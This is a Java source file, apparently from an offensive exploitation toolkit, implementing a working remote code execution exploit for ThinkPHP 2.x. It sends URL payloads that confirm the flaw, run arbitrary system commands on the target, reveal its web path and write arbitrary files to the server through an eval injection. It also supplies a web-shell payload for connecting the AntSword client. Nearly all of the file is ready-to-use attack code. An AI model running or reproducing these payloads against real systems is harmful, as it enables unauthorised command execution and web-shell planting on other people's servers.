package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/18 20:05
 * @github https://github.com/yhy0
 * ThinkPHP 2.x 任意代码执行漏洞
 */

public class ThinkPHP2x implements ExploitInterface {
    private String target = null;

    private boolean isVul = false;

    private HashMap<String, String> headers = new HashMap();
    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;
        // 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在
        String check_payload = "/index.php?s=/index/index/name/${@print(md5(123))}";
        // get 请求，根据不同的exp，可能需要不同的请求方式，看需更改
        Response response = HttpTools.get(this.target + check_payload, this.headers, "UTF-8");

        // 看回显，是否存在 202cb962ac59075b964b07152d234b70
        if(response.getText() != null  && response.getText().contains("202cb962ac59075b964b07152d234b70")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = "/index.php?s=/index/index/name/${@print(system(payload))}";

        // 替换payload 中的 payload 字符为要执行的命令
        payload = payload.replace("payload", cmd);

        Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");

        return Tools.regReplace(response.getText());
    }

    // 获取当前的web路径，有最好，没有也无所谓
    @Override
    public String getWebPath() {
        String payload = "/index.php?s=/index/index/name/${@print(realpath(__ROOT__))}";
        Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");

        // 这个payload会把 html网页也给输出，这里分割简单去除一下
        return Tools.regReplace(response.getText());

    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String result = "";
        // 对文件 base64 编码
        String base64Data = Base64.getEncoder().encodeToString(fileContent.getBytes());
        // 注意一下，需要对 base64 编码后的在进行一次url编码，
        base64Data = URLEncoder.encode(base64Data, "UTF-8" );

        String payload = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('" + filename + "',base64_decode('" + base64Data + "'));";

        Response response = HttpTools.get(this.target + payload, this.headers, "UTF-8");

        if (response.getError() == null) {
            // 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功
            response = HttpTools.get(this.target + "/" + filename, this.headers, "UTF-8");
            result = "上传成功! 路径： " + this.target + "/" + filename;
        } else {
            result =  "上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/${${@eval($_POST[1])}}";
        }

        return result;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
